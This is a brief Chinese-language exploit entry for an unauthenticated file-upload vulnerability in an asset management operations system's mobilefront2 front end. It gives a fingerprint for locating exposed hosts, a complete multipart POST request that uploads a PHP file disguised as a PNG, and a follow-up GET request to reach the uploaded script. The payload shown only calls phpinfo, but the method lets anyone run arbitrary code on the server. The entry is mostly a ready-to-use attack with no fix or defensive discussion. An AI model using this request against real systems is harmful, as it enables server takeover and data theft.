# 资产管理运营系统mobilefront2前台文件上传漏洞

- **系统**：资产管理运营系统mobilefront2前台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="media/css/uniform.default.css"`
- **请求**：`POST /mobilefront/c/2.php HTTP/1.1`
- **关键头**：`Content-Length: 235`　`Content-Type: multipart/form-data; boundary=---------------------------289…`　`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
-----------------------------289666258334735365651210512949
Content-Disposition: form-data; name="file1"; filename="1.php"
Content-Type: image/png
<?php phpinfo();?>
-----------------------------289666258334735365651210512949--
上传定位：
GET /mobilefront/c/images2/17321179881.php HTTP/1.1
Host:
X-Requested-With: XMLHttpRequest
```
- **预期**：200　|　—